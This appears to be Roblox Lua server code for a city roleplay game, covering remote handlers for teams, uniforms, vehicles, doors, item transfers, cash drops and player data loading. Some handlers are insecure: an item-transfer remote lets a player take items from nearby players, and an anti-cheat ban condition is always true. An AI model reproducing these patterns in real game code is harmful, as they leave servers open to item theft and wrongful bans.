RegisterRemote("Protest", function(Player, Tool, Text)
	if not Tool or not Text then
		return
	end

	if not Tool:IsDescendantOf(Player) or Tool.Class.Value ~= "ProtestSign" then
		return
	end

	local filter = game:GetService("TextService"):FilterStringAsync(Text,Player.UserId)
	local filterMsg = filter:GetNonChatStringForBroadcastAsync()
	print(filter)
	print(filterMsg)

	if Text == "" then
		Tool.Pole.SurfaceGui.Frame.TextLabel.Text = ""
	else
		Tool.Pole.SurfaceGui.Frame.TextLabel.Text = filterMsg
	end
end)

RegisterRemote("YUpdate", function(Player,Motor,Vector)
	for i, v in ipairs(Players:GetPlayers()) do
		if v.Character then
			Remotes.YUpdate:FireClient(v, Player.Character, Motor, Vector)
		end
	end
end)




RegisterRemote("Team", function(PlayerCalled,Id,Team)
	if not Distance(PlayerCalled, Id) then
		return;
	end;
	if not require(game.ServerScriptService.Services.VerifyService).CheckPermission(PlayerCalled, "CanChangeTeam", Team) then 
		warn("[" .. PlayerCalled.Name .. "] Attempted to join a team without permission")
		return 
	end
	coroutine.wrap(function()
		if Team ~= nil then
			PlayerCalled.TeamColor = Teams[Team].TeamColor
			Remotes.Notification:FireClient(PlayerCalled,"You have changed your team to "..Teams[Team].Name..".","Team Change!")
			if Teams[Team].Uniform then
				require(game.ServerScriptService.Services.FunctionService).WearUni(PlayerCalled)
			else
				require(game.ServerScriptService.Services.FunctionService).WearUniform(PlayerCalled,Id,nil,"Own",nil,nil)
			end

		else
			if PlayerCalled:GetRankInGroup(10980802) >= 2 and PlayerCalled:IsInGroup(10980802) then
				PlayerCalled.Team = game.Teams.Citizen
			else
				PlayerCalled.Team = game.Teams.Tourist
			end
			Remotes.Notification:FireClient(PlayerCalled,"You have changed your team to "..tostring(PlayerCalled.Team),"Team Change!")
			require(game.ServerScriptService.Services.FunctionService).WearUniform(PlayerCalled,Id,nil,"Own",nil,nil)
		end	
	end)()
end)

RegisterRemote("ChannelConnect", function(player, channel)
	ChannelConnected[player.UserId] = channel;
end);

local SetUniform = {}


RegisterRemote("Uniform", function(PlayerCalled,Id,Role,Uniform,HairID,Accessory)
	if not Distance(PlayerCalled, Id) then
		return;
	end;
	coroutine.wrap(function()
		local roles = require(game.ServerScriptService.Services.VerifyService).GetPlayerData(PlayerCalled)
		if Uniforms[Role] then
			if not roles[Role] then
				warn("["..PlayerCalled.Name.."] Attempted to apply uniform.")
				return
			end
		end
		Remotes.Notification:FireClient(PlayerCalled,"Equipped "..Uniform.." uniform.","Uniform Equipped!")
		require(game.ServerScriptService.Services.FunctionService).WearUniform(PlayerCalled,Id,Role,Uniform,HairID,Accessory)
		local HairSaveDatastore = DataStore2("Hair", PlayerCalled)
		local UniformDatastore = DataStore2("Uniform", PlayerCalled)
		local AccessoryDatastore = DataStore2("Accessory", PlayerCalled)

		if Accessory ~= nil then
			AccessoryDatastore:Set(Accessory)
		end
		UniformDatastore:Set(Uniform)
		HairSaveDatastore:Set(HairID)


		SetUniform[PlayerCalled.Name] = {PlayerCalled,Id,Role,Uniform,HairID,Accessory}
	end)()
end)


game.Players.PlayerRemoving:Connect(function(Player)
	if SetUniform[Player.Name] ~= nil then
		SetUniform[Player.Name] = nil 
	end
end)

function PlayerService:GetUniform(Player)
	return SetUniform[Player.Name]
end






RegisterRemote("VehicleControl", function(Player,Seat,Function,Additional)
	if not Player or not Seat or not Function then print("no") return end
	if Player:DistanceFromCharacter(Seat.Position) >= 25 then
		warn("[" .. Player.Name .. "] Attempted to fire VehicleControl beyond the distance limit!")
		return
	end
	if Function == "Lock" then
		if	Seat.Parent.DriverL.PlayerVal.Value == Player or require(game.ServerScriptService.Services.VerifyService).CheckPermission(Player, "CanSpawnVehicle", Seat.Parent.Parent.Name) then
			if Seat:FindFirstChild("Locked") then
				Seat:FindFirstChild("Locked").Value = not Seat:FindFirstChild("Locked").Value
			else
				Seat.Parent.DriverL:WaitForChild("Locked").Value = not Seat.Parent.DriverL:WaitForChild("Locked").Value
			end
		end
	end
	if Function == "Gear" then
		if Seat.Name ~= "DriverL" or Players:GetPlayerFromCharacter(Seat.Occupant.Parent) ~= Player then return end
		Seat.CurrentGearVal.Value = Additional
	end 
	if Function == "ParkBrake" then
		Seat.Parent.DriverL:FindFirstChild("BrakeBool").Value = Additional;
		return;
	end;
	if Function == "LightPatterns" then
		local light = HttpService:JSONDecode(Seat.LightPatterns.Value);
		local on = false;
		for i,v in pairs(light) do
			if v[1] == Additional[1] then
				table.remove(light, i);
				if v[2] ~= Additional[2] then
					table.insert(light, Additional);
				end;
				on = true;
				break;
			end;
		end;
		if not on then
			table.insert(light, Additional);
		end;
		Seat.LightPatterns.Value = HttpService:JSONEncode(light);
	end
	if Function == "Horn" then
		if Seat.Name ~= "DriverL" or Players:GetPlayerFromCharacter(Seat.Occupant.Parent) ~= Player then return end
		Seat.Horn.Value = true	
		game:GetService("RunService").Heartbeat:wait()
		Seat.Horn.Value = false
	end
	if Function == "Lights" then
		if Seat.Name ~= "DriverL" or Players:GetPlayerFromCharacter(Seat.Occupant.Parent) ~= Player then return end

		if Seat.LightBool.Value == true then
			Seat.LightBool.Value = false
		else
			Seat.LightBool.Value = true	
		end
	end
	if Function == "Indicate" then
		if Seat.Name ~= "DriverL" or Players:GetPlayerFromCharacter(Seat.Occupant.Parent) ~= Player then return end
		Seat.IndicatorInt.Value = Additional
	end
	if Function == "Sirens" then
		--	print(Additional)
		if Seat.Name ~= "DriverL" or Players:GetPlayerFromCharacter(Seat.Occupant.Parent) ~= Player then return end
		if Additional > 0 then
			Seat["Siren"..Additional].Value = not Seat["Siren"..Additional].Value
		else
			Seat.LightbarBool.Value = not Seat.LightbarBool.Value
		end
	end
end)
local gasConnections = {}

RegisterRemote("VehicleEnter", function(Player,Id,Seat,Value,Attchment) 

	if Player:DistanceFromCharacter(Seat.Position) >= 25 then
		warn("[" .. Player.Name .. "] Attempted to fire VehicleEnter beyond the distance limit!")
		return
	end
	if Seat.Parent.DriverL:FindFirstChild("Locked").Value and not Attchment and not require(game.ServerScriptService.Services.VerifyService).CheckPermission(Player, "CanArrest") and not require(game.ServerScriptService.Services.FunctionService).GlassOk(Seat) then
		return
	end
	if Value == true and Seat ~= nil then
		if tostring(Seat) == "DriverL" then
			Seat:Sit(Player.Character.Humanoid)
			gasConnections[Seat] = game:GetService("RunService").Heartbeat:Connect(function()
				if Seat and Seat:FindFirstChild("GasTank") and Seat.Velocity.Magnitude > 21  then
					local v69 = Seat.Velocity.Magnitude / 10
					Seat.GasTank.Value = Seat.GasTank.Value - 0.0110
				end
			end)
		else
			Seat:Sit(Player.Character.Humanoid)
		end
	end
	if Value == false and Attchment ~= nil then
		if tostring(Seat) == "DriverL" then
			Player.Character.Humanoid.Sit = false
			if gasConnections[Seat] then
				gasConnections[Seat]:Disconnect()
				gasConnections[Seat] = nil
			end
		else
			Player.Character.Humanoid.Sit = false
		end
	end
end)





RegisterRemote("MoveItem", function(Player, argPlayer, itemId, sepInv)
	local VerifyService = require(game.ServerScriptService.Services.VerifyService)
	local FunctionService = require(game.ServerScriptService.Services.FunctionService)
	if (Player.Character.HumanoidRootPart.Position - argPlayer.Character.HumanoidRootPart.Position).magnitude > 15 then return end

	local PlayerInventory = FunctionService.GetPlayerInventory(Player)
	local argPlayerInventory = FunctionService.GetPlayerInventory(argPlayer)

	for i,v in pairs(PlayerInventory) do
		if v[1] == itemId then
			FunctionService.RemoveItem(Player, itemId)
			FunctionService.GiveItem(argPlayer, v[2], Player, nil, argPlayer.Character, nil, true)
			--Remotes.OtherItemUpdate:FireClient(Player, argPlayer, argPlayerInventory);
			Remotes.OtherItemUpdate:FireClient(Player, argPlayer, argPlayerInventory);
			local jsonToSend = {
				embeds = {
					{
						title = "Transfer Event",
						type = "rich",
						description = Player.Name .. " has transferred a " .. Items[v[2]].Name .. " to " .. argPlayer.Name
					}
				}
			}
			WebService.SendJSON("TransferLog", jsonToSend)
			break
		end
	end

	for i,v in pairs(argPlayerInventory) do
		if v[1] == itemId then
			FunctionService.RemoveItem(argPlayer, itemId)
			FunctionService.GiveItem(Player, v[2], Player, nil, argPlayer.Character, nil, true)
			--Remotes.OtherItemUpdate:FireClient(Player, argPlayer, argPlayerInventory);
			Remotes.OtherItemUpdate:FireClient(Player, argPlayer, argPlayerInventory);
			local jsonToSend = {
				embeds = {
					{
						title = "Transfer Event",
						type = "rich",
						description = Player.Name .. " has transferred a " .. Items[v[2]].Name .. " from " .. argPlayer.Name
					}
				}
			}
			WebService.SendJSON("TransferLog", jsonToSend)
			break
		end
	end

end)

local BanCooldown = {}
local KeyWords = {"gamesense", "aim", "aimbot", "toggle", "chunk", "ashen", "loadstring", "gay", "GS", "toggled", "first", "person", "krnl","Avexus"}
RegisterRemote("OnTooIFire", function(Player, val1, Message)
	if BanCooldown[Player.UserId] == nil then
		pcall(function()
			BanCooldown[Player.UserId] = tick()
			local Reason

			if val1 == "Log" then
				for i,v in pairs(KeyWords) do
					if string.match(string.lower(Message), v) then
						WebService.SendJSON("VioLogs", {
							embeds = {
								{
									title = Player.Name,
									type = "rich",
									description = Message
								}
							}
						})
						BanCooldown[Player.UserId] = nil
						return
					end
				end
				if string.match(string.lower(Message), "script '") and not string.match(string.lower(Message), "workspace") and not string.match(string.lower(Message), "game") and not string.match(string.lower(Message), "player") then
					WebService.SendJSON("VioLogs", {
						embeds = {
							{
								title = Player.Name,
								type = "rich",
								description = Message
							}
						}
					})
					BanCooldown[Player.UserId] = nil
					return
				end

				for i,v in pairs(game.Players:GetChildren()) do
					if Message == v.Name then
						WebService.SendJSON("VioLogs", {
							embeds = {
								{
									title = Player.Name,
									type = "rich",
									description = Message
								}
							}
						})
						BanCooldown[Player.UserId] = nil
						return
					end
				end

				BanCooldown[Player.UserId] = nil
				return
			end

			if Player.UserId == 1769886077
				or Player.UserId == 47849198
				or Player.UserId == 2235064201
				or Player.Name == "Player1"
				or Player.Name == "Player2"
				or Player.UserId == 89222888
				or Player.UserId == 625922072
				or Player.UserId == 231665998 then
				return
			end
			if game.PrivateServerOwnerId ~= 0 and game.PrivateServerId ~= "" then
				return
			end

			if val1 == "Health" or "Roblox Client (Aimbot)" or "Hitboxes" or "WalkSpeed" or "Hook Attempt" or "HipHeight" or "MaxSlopeAngle" or "JumpPower" or "Physics" or "PhysicsVehicle" or "Roblox Client" or "Humanoid"  then
				Reason = "Altering their "..val1
			else
				return
			end
			require(game:GetService("ServerScriptService").Services.ModerationService).Ban('cityWARE', Player.Name, Reason)
			Player:Kick()
			wait(5)
			--WebService.SendJSON("ExploitLog", data)
			BanCooldown[Player.UserId] = nil
		end)
	end
end)






local DoorDelay = {}

RegisterRemote("Entry", function(Player, Id)
	if not Distance(Player, Id) then
		return;
	end;
	local Door = game.Workspace:FindFirstChild("Doors"):FindFirstChild(Id)
	if Door:FindFirstChild("Config") and Door:FindFirstChild("Config"):FindFirstChild("Permissions") then
		local roles = require(game.ServerScriptService.Services.VerifyService).GetPlayerData(Player)
		local perms = HttpService:JSONDecode(Door.Config.Permissions.Value)
		local verify
		for i,v in pairs(perms) do
			if roles[v] then
				verify = true
				break
			end
		end
		if not verify then
			return
		end
	end
	if DoorDelay[Id] then
		return
	end
	DoorDelay[Id] = true

	local SoundPart = Instance.new("Part")
	SoundPart.Size = Vector3.new(1,1,1)
	SoundPart.Position = game.Workspace.Interactions[Id].Position
	SoundPart.Anchored = true
	SoundPart.Transparency = 1
	SoundPart.CanCollide = false
	SoundPart.Parent = game.Workspace.InvisibleParts
	local SoundOpen = Instance.new("Sound")
	local SoundClose = Instance.new("Sound")
	SoundOpen.SoundId = "rbxassetid://"..Gateways[Door.Config.Type.Value].SoundOpen
	SoundClose.SoundId = "rbxassetid://"..Gateways[Door.Config.Type.Value].SoundClose
	SoundOpen.MaxDistance = Gateways[Door.Config.Type.Value].SoundMaxDistance
	SoundClose.MaxDistance = Gateways[Door.Config.Type.Value].SoundMaxDistance
	SoundOpen.Parent = SoundPart
	SoundClose.Parent = SoundPart


	if Door.Config.State.Value == false then
		for i,v in pairs(Door:GetDescendants()) do
			if v:IsA("Part") and v.Name == "Motor" then
				v.Motor.MaxVelocity = Gateways[Door.Config.Type.Value].VelocityOpen
				v.Motor.DesiredAngle = math.rad(Gateways[Door.Config.Type.Value].Angle)
			end
		end
		SoundOpen:Play()
		Door.Config.State.Value = true

		if Gateways[Door.Config.Type.Value].AutoClose then
			delay(Gateways[Door.Config.Type.Value].AutoClose, function()
				if Door.Config.State.Value == true then
					for i,v in pairs(Door:GetDescendants()) do
						if v:IsA("Part") and v.Name == "Motor" then
							v.Motor.MaxVelocity = Gateways[Door.Config.Type.Value].VelocityClose
							v.Motor.DesiredAngle = 0
						end
					end
					SoundClose:Play()
					Door.Config.State.Value = false
				end
			end)
		end

	elseif Door.Config.State.Value == true then
		for i,v in pairs(Door:GetDescendants()) do
			if v:IsA("Part") and v.Name == "Motor" then
				v.Motor.MaxVelocity = Gateways[Door.Config.Type.Value].VelocityClose
				v.Motor.DesiredAngle = 0
			end
		end
		SoundClose:Play()
		Door.Config.State.Value = false
	end

	for i,v in pairs(Door:GetDescendants()) do
		if v:IsA("Part") and v.Name == "Motor" then
			repeat
				wait(1)
			until v.Motor.DesiredAngle == v.Motor.CurrentAngle
			DoorDelay[Id] = nil
		end
	end
end)

local DrownStatus = {}
local MarketPlaceService = game:GetService("MarketplaceService")

RegisterRemote("Drown", function(Player, State)
	if not State then
		DrownStatus[Player.Name] = nil
		return
	end
	if State then
		coroutine.wrap(function()
			DrownStatus[Player.Name] = true
			repeat
				Player.Character.Humanoid:TakeDamage(math.random(3,6))
				wait(1)
			until DrownStatus[Player.Name] == nil or Player.Character.Humanoid.Health <= 0
		end)()
	end
end)

RegisterRemote("ClothingPurchase", function(Player, Clothing)
	MarketPlaceService:PromptPurchase(Player, Clothing)
end)





RegisterRemote("Interact", function(Player)
	return Interactions
end)


PlayerService.dropTool = dropTool
PlayerService.Distance = Distance
PlayerService.Interactions = Interactions
PlayerService.GlobalVehicles = GlobalVehicles
return PlayerService


playerservice.dropcash
local debounce = false
local DataStore2 = require(game.ServerScriptService.MainModule)
local WebService = require(game.ServerScriptService.Services.WebService)
local VerifyService = require(game.ServerScriptService.Services.VerifyService)
local RemoteService = require(game.ServerScriptService.Services.RemoteService)

local PickupCashDetection = function(P, Player)
	P.Touched:Connect(function(OP)

		if debounce == true then return nil

		else

			if OP.Name == "Wallet" then
				debounce = true
				local PlayerCash = VerifyService:GetData(Player).Cash

				game:GetService("ReplicatedStorage").Remotes.Notification:FireClient(Player, "You picked up $"..OP.Amount.Value.." from the ground.", "Cash Pickup!")
				VerifyService:GetData(Player).Cash = VerifyService:GetData(Player).Cash + OP.Amount.Value
				RemoteService.UpdateMoney(Player)
				local jsonToSend = {
					embeds = {
						{
							title = "Log Event",
							type = "rich",
							description = Player.Name .. " has picked up $"..OP.Amount.Value.." from "..tostring(OP.Player.Value).."",
						}
					}
				}
				OP.Parent:Destroy()
				WebService.SendJSON("DrpLog", jsonToSend)
				wait(1)
				debounce = false
			end
		end
	end)
end

local Dropped = {}

game.Players.PlayerAdded:Connect(function(Player)
	Player.Chatted:Connect(function(Msg)
		if string.lower(string.sub(Msg, 1, 9)) == "/dropcash" then
			local amount = tonumber(string.sub(Msg, 10));
			local PlayerCash = VerifyService:GetData(Player).Cash
			if type(amount) ~= "number" or amount == nil then
				return
			elseif amount < 0 then
				return
			elseif amount < 10 then
				game.ReplicatedStorage.Remotes.Notification:FireClient(Player, "You must drop more than $10.", "Cash Drop!", "Red")
			elseif PlayerCash < amount then
				game.ReplicatedStorage.Remotes.Notification:FireClient(Player, "You do not have enough money in your wallet.", "Cash Drop!", "Red")
			elseif PlayerCash >= amount or PlayerCash == amount then
				--local WalletAmount = 0
				--for i,v in pairs(workspace:GetChildren()) do
				--	if v.Name == "Wallet" then
				--		if v.Wallet:FindFirstChild("Player") then
				--			if v.Wallet.Player.Value == Player then
				--				WalletAmount = WalletAmount + 1
				--			end
				--		end
				--	end
				--end
				--if WalletAmount == 1 then
				--	game.ReplicatedStorage.Remotes.Notification:FireClient(Player, "Your existing cash drop must be picked up first.", "Cash Drop!", "Red")
				--	return
				--end
				for i,v in pairs(game.Workspace:GetChildren()) do 
					if v.Name == "Wallet" then
						if v.Wallet["Player"].Value == Player then
							game.ReplicatedStorage.Remotes.Notification:FireClient(Player, "Your existing cash drop must be picked up first.", "Cash Drop!", "Red")
							return
						end
					end
				end
				local DropWallet = script.Wallet:Clone();
				local AmountValue = Instance.new("IntValue", DropWallet.Wallet);
				AmountValue.Name = "Amount"; AmountValue.Value = amount;
				local PlayerValue = Instance.new("ObjectValue", DropWallet.Wallet);
				PlayerValue.Name = "Player"; PlayerValue.Value = Player;
				DropWallet.Parent = workspace;
				DropWallet:SetPrimaryPartCFrame(Player.Character.Torso.CFrame:toWorldSpace(CFrame.new(0,0,-3)))
				VerifyService:GetData(Player).Cash = PlayerCash-amount
				RemoteService.UpdateMoney(Player)
				game:GetService("ReplicatedStorage").Remotes.Notification:FireClient(Player, "You have dropped $"..amount.." cash.", "Cash Drop!")
				local jsonToSend = {
					embeds = {
						{
							title = "Log Event",
							type = "rich",
							description = Player.Name .. " has dropped $"..amount.. ".",
						}
					}
				}
				WebService.SendJSON("DrpLog", jsonToSend)
				delay(60, function ()
					DropWallet:Destroy()
				end)
			end
		end
	end)

	Player.CharacterAdded:Connect(function(Char)
		PickupCashDetection(Char["Left Leg"], Player)
		PickupCashDetection(Char["Right Leg"], Player)
	end)
end)

playerservice.flyingbomb
script.ChildAdded:Connect(function(Object)
	coroutine.wrap(function()
		local Player = Object.Value
		local Bomb = script:FindFirstChild("FlyingBomb"):Clone()
		Bomb.Parent = workspace.InvisibleParts
		Bomb.Root.RocketPropulsion.Target = Player.Character.Head
		Bomb.Root.RocketPropulsion:Fire()
		local tbl = {
			math.random(300,500),
			math.random(-500,-300)
		}
		local tbl2 = {
			math.random(300,500),
			math.random(-500,-300)
		}
		Bomb:SetPrimaryPartCFrame(Player.Character.Head.CFrame + Vector3.new(tbl[math.random(2)], 600, tbl2[math.random(2)]))
		Bomb.Root.PropSound:Play()
		delay(10, function()
			Bomb.Root.PropSound:Stop()
			Bomb.Root.WhistleSound:Play()
			Bomb.EffectPart.ParticleEmitter.Enabled = false
			Bomb.Root.BodyGyro.MaxTorque = Vector3.new(0, 0, 400000)
			Bomb.Root.BodyPosition.MaxForce = Vector3.new(0, 7500, 0)
			Bomb.Root.RocketPropulsion.MaxThrust = 150000
		end)
		Bomb.Root.RocketPropulsion.ReachedTarget:Connect(function()
			Bomb.Root.ExplodeSound:Play()
			Bomb.Root.ExplodeSound.Parent = Player.Character.Head
			Bomb:Destroy()
			local explosion = Instance.new("Explosion")
			explosion.BlastPressure = 0
			explosion.BlastRadius = 0
			explosion.DestroyJointRadiusPercent = 0
			explosion.ExplosionType = Enum.ExplosionType.NoCraters
			explosion.Parent = workspace.InvisibleParts
			explosion.Position = Player.Character.Head.Position
			Player.Character.Humanoid:TakeDamage(100)
		end)
		wait(0.5)
		Object:Destroy()
	end)()
end)

playerservice.streetlights
local Lighting = game:GetService("Lighting")
local CollectionService = game:GetService("CollectionService")
local MinutesAfterMidnight = 0
local Lights = false
local map = game.Workspace
local StreetLights_folder = map:WaitForChild("StreetLights")
local all_streetlights = StreetLights_folder:GetChildren()
local RunService = game:GetService("RunService")
MinutesAfterMidnight = Lighting.ClockTime*60
Lighting:SetMinutesAfterMidnight(MinutesAfterMidnight)

local function switchOn()
	for i,v in ipairs(game.Workspace.StreetLights:GetDescendants()) do
		RunService.Heartbeat:wait()
		if v.Name == "Light" then
			if v:IsA("UnionOperation") or v:IsA("Part") or v:IsA("MeshPart") then
				v.Material = Enum.Material.Neon
			end
		end
		if v:IsA("SurfaceLight") or v:IsA("SpotLight") or v:IsA("PointLight") then
			v.Enabled = true
		end
	end
end
local function switchOff()
	for i,v in ipairs(game.Workspace.StreetLights:GetDescendants()) do
		RunService.Heartbeat:wait()
		if v.Name == "Light" then
			if v:IsA("UnionOperation") or v:IsA("Part") or v:IsA("MeshPart") then
				v.Material = Enum.Material.SmoothPlastic
			end
		end
		if v:IsA("SurfaceLight") or v:IsA("SpotLight") or v:IsA("PointLight") then
			v.Enabled = false
		end
	end
end
Lighting.Changed:Connect(function()
	RunService.Heartbeat:wait()
	if Lighting.TimeOfDay == "00:00:00" then
		switchOn()
	elseif Lighting.TimeOfDay == "06:00:00" then
		switchOff()
	elseif Lighting.TimeOfDay == "18:00:00" then
		switchOn()
	end
end)

while wait(15) do
	MinutesAfterMidnight = MinutesAfterMidnight+10
	Lighting:SetMinutesAfterMidnight(MinutesAfterMidnight)
end

  services.remoteservice

local API = {}
local RunService = game:GetService("RunService")
local ACCOUNT_AGE = 40
local Remotes = game.ReplicatedStorage.Remotes
local DataStoreService = game:GetService("DataStoreService")
local Key = "Skeepth"
local PlayerDataStore = DataStoreService:GetGlobalDataStore()
local Debug = false
local DataStore2 = require(game.ServerScriptService.MainModule)
local Teams = require(game.ReplicatedStorage.Databases.Teams)
local RolesData = require(game.ReplicatedStorage.Databases.Roles)
local Items = require(game.ReplicatedStorage.Databases.Items)
local CollectionService = game:GetService("CollectionService")
local warrants = {}
local Players = game:GetService("Players")
local Developers = {
	89222888,
	3235903,
	52942723,
	1079811612,
	204160865
}


local function GetTeamFromColor(brickColor)
	for i, v in pairs(Teams) do
		if v.TeamColor == brickColor then
			return i
		end
	end
end

function API.UpdateMoney(Player)
	Remotes.BankUpdate:FireClient(Player, 1, tonumber(require(game.ServerScriptService.Services.VerifyService):GetData(Player).Bank))
	Remotes.BankUpdate:FireClient(Player, 2, tonumber(require(game.ServerScriptService.Services.VerifyService):GetData(Player).Cash))
end




local function LoadPlayerData(Player)
	local timerConn
	local v1 = require(game.ServerScriptService.Services.FunctionService).GetRecord(Player.Name)	
	if #v1 >= 1 then	
		local v2 = v1[#v1]	
		if v2[6] == nil or v2[2] == nil then		
			return			
		end	
		local v3 = require(game.ReplicatedStorage.Databases.Crimes)[v2[4]]	
		local v4 = v2[2] + v2[6]	
		local v5 = v4 - os.time()		
		if v5 >= 1 then						
			if Player.Team ~= game.Teams.Incarcerated then						
				Player.Team = game.Teams.Incarcerated						
				delay(0.5, function()	
					Remotes.GetInv:FireClient(Player,{})	
					Player:LoadCharacter()
				end)
			end
		end
	end
end



function API.OnPlayerAdded(Player)
	print("[" .. Player.Name .. "] Player added")

	if Player.AccountAge <= ACCOUNT_AGE and not RunService:IsStudio() and Player.UserId ~= 2592757672 and Player.UserId ~= game.CreatorId then
		Player:Kick("Accounts under 40 days old are disallowed from joining.")
		return
	end

	local username = tostring(Player.Name)
	if string.match(username, "Zer0NSA") and string.match(username, "_") then 
		require(game.ServerScriptService.Services.ModerationService).Kick("cityWARE", Player.Name, "Oops")
		return
	end

	local PlayerData = PlayerDataStore:GetAsync(Player.UserId..Key)
	local DataTable = require(game.ServerScriptService.Services.VerifyService):GetData(Player, false)

	if PlayerData == nil then
		DataTable[Player.Name] = {
			Bank = 1500, 
			Cash = 0,
			Records = {},
			Vehicles = {},
			FineAmount = 0,
			Inventory = {},
			Karma = 0,
			Team = 1,
			WarrantTable = {},
			Combat = false,
			Plate =  math.random(1,9)..string.upper(string.char(math.random(97,122)))..math.random(1,9).."-"..string.upper(string.char(math.random(97,122)))..math.random(1,9)..string.upper(string.char(math.random(97,122)))..math.random(1,9),
			Number = math.random(100, 999),
			WeaponLicenseCooldown = 0,
			Jailed = false,
			Moderator = false,
			Admin = false,
			Developer = false,
			WeaponLicense = false,
			Beloved = false
		}
		if table.find(Developers, Player.UserId) then
			DataTable[Player.Name].Developer = true
		end

		if require(game.ServerScriptService.Services.VerifyService).GetPlayerData(Player).Citizen then
			DataTable[Player.Name].Team = 2
			for i,v in pairs(Teams) do
				if i == DataTable[Player.Name].Team then
					Player.TeamColor = v.TeamColor
					break
				end
			end
		end
	else
		DataTable[Player.Name] = PlayerData
		if table.find(Developers, Player.UserId) then
			DataTable[Player.Name].Developer = true
		end
		for i,v in pairs(Teams) do
			if i == DataTable[Player.Name].Team then
				if DataTable[Player.Name].Jailed then
					Player.Team = game.Teams.Incarcerated
					delay(0.5, function()
						Player:LoadCharacter()
					end)
					break
				end
				Player.TeamColor = v.TeamColor
				if Player.Team == game.Teams.Tourist then
					if require(game.ServerScriptService.Services.VerifyService).GetPlayerData(Player).Citizen then
						DataTable[Player.Name].Team = 2
						for i,v in pairs(Teams) do
							if i == DataTable[Player.Name].Team then
								Player.TeamColor = v.TeamColor
								break
							end
						end
					end
				end
				for i,v in pairs(RolesData) do     
					if v.GroupCriteria ~= nil then
						for e,h in pairs(v.GroupCriteria) do
							if not h[2] then
								if v.TeamCriteria ~= nil then
									if GetTeamFromColor(Player.TeamColor) == v.TeamCriteria[1] then
										if not Player:IsInGroup(h[1]) then
											if require(game.ServerScriptService.Services.VerifyService).GetPlayerData(Player).Citizen then
												Player.Team = game.Teams.Citizen
											else
												Player.Team = game.Teams.Tourist
											end
										end
									end
								end
							end
						end
					end
				end
				delay(0.5, function()
					Player:LoadCharacter()
				end)
				break
			end
		end
		if DataTable[Player.Name].Combat then
			Remotes.Notification:FireClient(Player, "You left in combat, your inventory, vehicle inventory, and wallet have been reset.", "Combat Log!", "Red", true)
		end

		--for i,v in pairs(DataTable[Player.Name].Records) do
		--	if v[1] == 0 then
		--		if (os.time() - v[2]) <= 1800 then
		--			if not DataTable[Player.Name].WarrantTable.Type then
		--				DataTable[Player.Name].WarrantTable = {
		--					Type = 1,
		--					Issuer = Players:GetNameFromUserIdAsync(v[3]),
		--					Reason = "Failing to pay a fine within 30 minutes.",
		--					Crime = 34
		--				}
		--				break
		--			end
		--		end
		--	end
		--end

		if require(game.ServerScriptService.Services.VerifyService):GetData(Player).WarrantTable.Type  then
			if require(game.ServerScriptService.Services.VerifyService):GetData(Player).WarrantTable.Type == -1 then
				table.insert(warrants, {Player, -1})
				for i,v in pairs(Players:GetPlayers()) do
					if require(game.ServerScriptService.Services.VerifyService).CheckPermission(v, "CanArrest") then
						Remotes.Warrant:FireClient(v, warrants)
					end
				end
				game.ReplicatedStorage.Remotes.Notification:FireClient(Player,'You have been issued with a search warrant and are expected to expose your inventory (and vehicle inventories) to law enforcement personnel!','Search Warrant','Red',true)
			else
				table.insert(warrants, {Player, 1})
				for i,v in pairs(Players:GetPlayers()) do
					if require(game.ServerScriptService.Services.VerifyService).CheckPermission(v, "CanArrest") then
						Remotes.Warrant:FireClient(v, warrants)
					end
				end
				Remotes.Notification:FireClient(Player,  "You have been issued with an arrest warrant and are actively being pursued for "..require(game.ReplicatedStorage.Databases.Crimes)[require(game.ServerScriptService.Services.VerifyService):GetData(Player).WarrantTable.Crime].Name.."!", "Arrest Warrant!", "Red", true)
			end
		end



		DataTable[Player.Name].Combat = false	

		LoadPlayerData(Player)


		if Player.Team == game.Teams["Incarcerated"] then
			local record = require(game.ServerScriptService.Services.FunctionService).GetRecord(Player.Name)		
			local arrestCrime = record[#record]		
			local crimeData = require(game.ReplicatedStorage.Databases.Crimes)[arrestCrime[4]]		
			local releaseTime = arrestCrime[2] + arrestCrime[6]	
			local timerConn
			local timeLeft = (arrestCrime[2] + arrestCrime[6]) - os.time()

			delay(timeLeft, function()
				if not Players:FindFirstChild(Player.Name) then		
					return					
				end
				Player.TeamColor = Teams[require(game.ServerScriptService.Services.VerifyService):GetData(Player).Team].TeamColor
				wait(0.5)
				Remotes.GetInv:FireClient(Player,{})
				Player:LoadCharacter()
			end)
		end
	end
	Player.Changed:Connect(function(Value)
		if Value == "Team" then
			if Player.Team ~= game.Teams.Incarcerated then
				DataTable[Player.Name].Team = GetTeamFromColor(Player.TeamColor)
				DataTable[Player.Name].Jailed = false
			else
				DataTable[Player.Name].Jailed = true
			end
			Remotes.RolesChanged:FireClient(Player, require(game.ServerScriptService.Services.VerifyService).GetPlayerData(Player))

			if require(game.ServerScriptService.Services.VerifyService).CheckPermission(Player, "CanArrest") then
				local NewWarrants = {}
				for i,v in pairs(game.Players:GetPlayers()) do
					if require(game.ServerScriptService.Services.VerifyService):GetData(v).WarrantTable.Type ~= nil then
						table.insert(NewWarrants, {v, require(game.ServerScriptService.Services.VerifyService):GetData(v).WarrantTable.Type})
					end
				end

				Remotes.Warrant:FireClient(Player, NewWarrants)
			end
		end
	end)





	local FunctionService = require(game.ServerScriptService.Services.FunctionService)
	local PlayerService = require(game.ServerScriptService.Services.PlayerService)
	local VerifyService = require(game.ServerScriptService.Services.VerifyService)
	local WebService = require(game.ServerScriptService.Services.WebService)

	Player.CharacterAppearanceLoaded:Connect(function(char)
		pcall(function()
			Player.DisplayName = Player.Name
		end)
		char:WaitForChild("Humanoid", 5).DisplayName = Player.Name

		--if Player.Name == "unpept" then
		--	return
		--end 

		if VerifyService:GetData(Player).WeaponLicense then
			delay(1, function()
				if not VerifyService.HaveItem(Player, "FOID") then
					FunctionService.GiveItem(Player, "FOID")
				end
			end)
		end	

		Remotes.RolesChanged:FireClient(Player, VerifyService.GetPlayerData(Player))

		char:WaitForChild('Humanoid').DisplayName = char.Name;
		CollectionService:AddTag(Player.Character, "Character")
		local root = char:WaitForChild("HumanoidRootPart")
		local humanoid = char:WaitForChild("Humanoid")
		if not (Player.Character == nil) then
			CollectionService:AddTag(Player.Character, "Character")
			if humanoid and root then
				local headHeight
				wait(3) 
				humanoid.FreeFalling:Connect(function (state)
					if state then
						headHeight = root.Position.Y
					elseif not state and headHeight ~= nil then
						coroutine.wrap(function()
							local fell = headHeight - root.Position.Y
							if fell >= 33 then
								humanoid.Health = 0
							elseif fell >= 17 then
								humanoid.Health = humanoid.Health - math.floor(fell)
							end
						end)()
					end
				end)
			end
